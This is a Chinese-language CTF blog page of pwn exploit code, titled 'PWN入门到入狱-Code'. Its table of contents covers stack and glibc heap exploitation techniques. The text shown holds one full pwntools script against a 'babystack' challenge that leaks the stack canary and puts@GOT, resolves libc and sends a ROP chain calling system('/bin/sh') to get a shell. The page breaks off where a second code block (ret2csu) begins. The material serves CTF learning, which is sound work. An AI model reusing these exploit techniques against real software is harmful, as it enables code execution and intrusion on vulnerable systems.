<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门到入狱-Code | Ma9icCR</title><meta name="description" content="PWN入门到入狱-Codeleak_canary+libc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *# p&#x3D;remote"><meta name="keywords" content="pwn"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2022-04/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Code/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="PWN入门到入狱-Code"><meta property="og:url" content="https://ma9iccr.github.io/2022-04/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Code/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="PWN入门到入狱-Codeleak_canary+libc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *# p&#x3D;remote"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><meta property="article:published_time" content="2022-04-15T03:33:02.000Z"><meta property="article:modified_time" content="2022-08-08T01:03:10.474Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="KeepTrying" href="https://ma9iccr.github.io/2022-04/KeepTrying/"><link rel="next" title="PWN入门到入狱-Integer" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Integer/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-08-08 09:03:10'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">37</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">15</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">12</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN入门到入狱-Code"><span class="toc-number">1.</span> <span class="toc-text">PWN入门到入狱-Code</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#leak-canary-libc"><span class="toc-number">1.1.</span> <span class="toc-text">leak_canary+libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.2.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-libc"><span class="toc-number">1.3.</span> <span class="toc-text">ROP+libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-pvoit-栈迁移"><span class="toc-number">1.4.</span> <span class="toc-text">stack pvoit 栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串修改内存"><span class="toc-number">1.5.</span> <span class="toc-text">格式化字符串修改内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#栈迁移-gadget"><span class="toc-number">1.6.</span> <span class="toc-text">栈迁移+gadget</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Heap-Exp-Code"><span class="toc-number">2.</span> <span class="toc-text">Heap-Exp-Code</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-libc-2-27-off-by-null-UAF-one-gadget"><span class="toc-number">2.1.</span> <span class="toc-text">tcache + libc-2.27 + off by null + UAF + one-gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-libc-2-27-off-by-null-UAF-one-gadget-任意大小的堆块"><span class="toc-number">2.2.</span> <span class="toc-text">tcache + libc-2.27 + off by null + UAF + one-gadget + 任意大小的堆块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-libc-2-27-off-by-null-没有打印函数-IO-FILE结构体泄露地址"><span class="toc-number">2.3.</span> <span class="toc-text">tcache + libc-2.27 + off by null + 没有打印函数 + IO_FILE结构体泄露地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#劫持vtable-libc-2-23-off-by-null-chunk-size-lt-0x120"><span class="toc-number">2.4.</span> <span class="toc-text">劫持vtable + libc-2.23 + off by null + chunk_size&lt;&#x3D; 0x120</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stdout-leak-realloc-hook-调栈-add-delete"><span class="toc-number">2.5.</span> <span class="toc-text">stdout leak + realloc_hook 调栈 + add&#x2F;delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack-libc-2-27-FSOP-set-context"><span class="toc-number">2.6.</span> <span class="toc-text">unsorted bin attack + libc-2.27 + FSOP + set_context</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-2-31-UAF-chunk-size-lt-0x80"><span class="toc-number">2.7.</span> <span class="toc-text">libc-2.31 + UAF + chunk_size&lt;&#x3D;0x80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-2-33-UAF-chunk-size-lt-0x80"><span class="toc-number">2.8.</span> <span class="toc-text">libc-2.33 + UAF + chunk_size&lt;&#x3D;0x80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN堆Heap总结UAF专场"><span class="toc-number">2.9.</span> <span class="toc-text">PWN堆Heap总结UAF专场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、Glibc2-23"><span class="toc-number">2.9.1.</span> <span class="toc-text">一、Glibc2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-UAF-Leak-Size不做限制："><span class="toc-number">2.9.1.1.</span> <span class="toc-text">1.UAF + Leak + Size不做限制：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UAF-Leak-size限制"><span class="toc-number">2.9.1.2.</span> <span class="toc-text">2.UAF + Leak + size限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-UAF-无Leak-Size不做限制"><span class="toc-number">2.9.1.3.</span> <span class="toc-text">3.UAF + 无Leak + Size不做限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-UAF-无Leak-Size做限制"><span class="toc-number">2.9.1.4.</span> <span class="toc-text">4.UAF + 无Leak + Size做限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、Glibc2-27"><span class="toc-number">2.9.2.</span> <span class="toc-text">二、Glibc2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Sashing机制带来的改变"><span class="toc-number">2.9.2.1.</span> <span class="toc-text">1.Sashing机制带来的改变</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-加入的检查判断："><span class="toc-number">2.9.2.1.1.</span> <span class="toc-text">(1)加入的检查判断：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-对抗利用："><span class="toc-number">2.9.2.1.2.</span> <span class="toc-text">(2)对抗利用：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Glibc2-27Tcache题外话："><span class="toc-number">2.9.2.2.</span> <span class="toc-text">2.Glibc2.27Tcache题外话：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Key字段新增："><span class="toc-number">2.9.2.2.1.</span> <span class="toc-text">(1)Key字段新增：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Tcache数量限制"><span class="toc-number">2.9.2.2.2.</span> <span class="toc-text">(2)Tcache数量限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、Glibc2-29"><span class="toc-number">2.9.3.</span> <span class="toc-text">三、Glibc2.29</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-部分手段失效"><span class="toc-number">2.9.3.1.</span> <span class="toc-text">1.部分手段失效</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-unsortedbin-attack失效"><span class="toc-number">2.9.3.1.1.</span> <span class="toc-text">(1)unsortedbin attack失效</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-top-chunk改写限制"><span class="toc-number">2.9.3.1.2.</span> <span class="toc-text">(2)top_chunk改写限制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-unlink方面一些限制"><span class="toc-number">2.9.3.1.3.</span> <span class="toc-text">(3)unlink方面一些限制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-tcache方面的变化"><span class="toc-number">2.9.3.1.4.</span> <span class="toc-text">(4)tcache方面的变化</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UAF常见限制"><span class="toc-number">2.9.3.2.</span> <span class="toc-text">2.UAF常见限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-UAF-Leak-Size不做限制：-1"><span class="toc-number">2.9.3.2.1.</span> <span class="toc-text">(1)UAF + Leak + Size不做限制：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-UAF-Leak-Size做限制"><span class="toc-number">2.9.3.2.2.</span> <span class="toc-text">(2)UAF+Leak+Size做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-UAF-无Leak-Size不做限制-1"><span class="toc-number">2.9.3.2.3.</span> <span class="toc-text">(3)UAF+无Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-UAF-无Leak-Size做限制-1"><span class="toc-number">2.9.3.2.4.</span> <span class="toc-text">(4)UAF+无Leak+Size做限制:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、Glibc2-31"><span class="toc-number">2.9.4.</span> <span class="toc-text">四、Glibc2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-部分手段失效-1"><span class="toc-number">2.9.4.1.</span> <span class="toc-text">1.部分手段失效</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-原始largebin-attack失效"><span class="toc-number">2.9.4.1.1.</span> <span class="toc-text">(1)原始largebin attack失效</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Tcache结构扩大"><span class="toc-number">2.9.4.1.2.</span> <span class="toc-text">(2)Tcache结构扩大</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-删除了一些assert"><span class="toc-number">2.9.4.1.3.</span> <span class="toc-text">(3)删除了一些assert</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-对count新增了一些限制"><span class="toc-number">2.9.4.1.4.</span> <span class="toc-text">(4)对count新增了一些限制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UAF常见限制-1"><span class="toc-number">2.9.4.2.</span> <span class="toc-text">2.UAF常见限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-UAF-Leak-Size不做限制"><span class="toc-number">2.9.4.2.1.</span> <span class="toc-text">(1)UAF+Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-UAF-Leak-Size做限制-1"><span class="toc-number">2.9.4.2.2.</span> <span class="toc-text">(2)UAF+Leak+Size做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-UAF-无Leak-Size不做限制-2"><span class="toc-number">2.9.4.2.3.</span> <span class="toc-text">(3)UAF+无Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-UAF-无Leak-Size做限制-2"><span class="toc-number">2.9.4.2.4.</span> <span class="toc-text">(4)UAF+无Leak+Size做限制:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五、Glibc2-32"><span class="toc-number">2.9.5.</span> <span class="toc-text">五、Glibc2.32</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-新增机制"><span class="toc-number">2.9.5.1.</span> <span class="toc-text">1.新增机制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Tcache和Fastbin新增指针异或检查的safe-linking机制"><span class="toc-number">2.9.5.1.1.</span> <span class="toc-text">(1)Tcache和Fastbin新增指针异或检查的safe-linking机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-新增机制Safe-linking的漏洞"><span class="toc-number">2.9.5.1.2.</span> <span class="toc-text">(2)新增机制Safe-linking的漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-新增Tcache地址对齐检查"><span class="toc-number">2.9.5.1.3.</span> <span class="toc-text">(3)新增Tcache地址对齐检查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UAF常见限制-2"><span class="toc-number">2.9.5.2.</span> <span class="toc-text">2.UAF常见限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-UAF-Leak-Size不做限制-1"><span class="toc-number">2.9.5.2.1.</span> <span class="toc-text">(1)UAF+Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-UAF-Leak-Size做限制-2"><span class="toc-number">2.9.5.2.2.</span> <span class="toc-text">(2)UAF+Leak+Size做限制:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-UAF-无Leak-Size做限制"><span class="toc-number">2.9.5.2.3.</span> <span class="toc-text">(3)UAF+无Leak+Size做限制:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">2.9.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不同libc版本下UAF的利用手法总结"><span class="toc-number">2.10.</span> <span class="toc-text">不同libc版本下UAF的利用手法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-23"><span class="toc-number">2.10.1.</span> <span class="toc-text">2.23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-27"><span class="toc-number">2.10.2.</span> <span class="toc-text">2.27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-31"><span class="toc-number">2.10.3.</span> <span class="toc-text">2.31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-32"><span class="toc-number">2.10.4.</span> <span class="toc-text">2.32</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.10.4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#跟踪调试"><span class="toc-number">2.10.4.2.</span> <span class="toc-text">跟踪调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#free过程"><span class="toc-number">2.10.4.2.1.</span> <span class="toc-text">free过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#malloc过程"><span class="toc-number">2.10.4.2.2.</span> <span class="toc-text">malloc过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用手法"><span class="toc-number">2.10.4.3.</span> <span class="toc-text">利用手法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-2-32-限制分配堆块小于-0x80-打印1次、编辑2次"><span class="toc-number">2.11.</span> <span class="toc-text">libc 2.32 + 限制分配堆块小于 0x80 + 打印1次、编辑2次</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc2-32下堆基址的新泄露方式"><span class="toc-number">2.11.1.</span> <span class="toc-text">glibc2.32下堆基址的新泄露方式</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">PWN入门到入狱-Code</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2022-04-15 11:33:02"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2022-04-15</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-08-08 09:03:10"><i class="fas fa-history fa-fw"></i> 更新于 2022-08-08</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="PWN入门到入狱-Code"><a href="#PWN入门到入狱-Code" class="headerlink" title="PWN入门到入狱-Code"></a>PWN入门到入狱-Code</h1><h2 id="leak-canary-libc"><a href="#leak-canary-libc" class="headerlink" title="leak_canary+libc"></a>leak_canary+libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote('node4.buuoj.cn',28688)</span></span><br><span class="line">p=process(<span class="string">'./babystack'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a\n'</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">log.info(hex(canary))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露puts函数的got表地址</span></span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到对应的libc版本</span></span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算system函数和字符串‘/bin/sh’在程序里的实际地址</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop攻击获取shell</span></span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 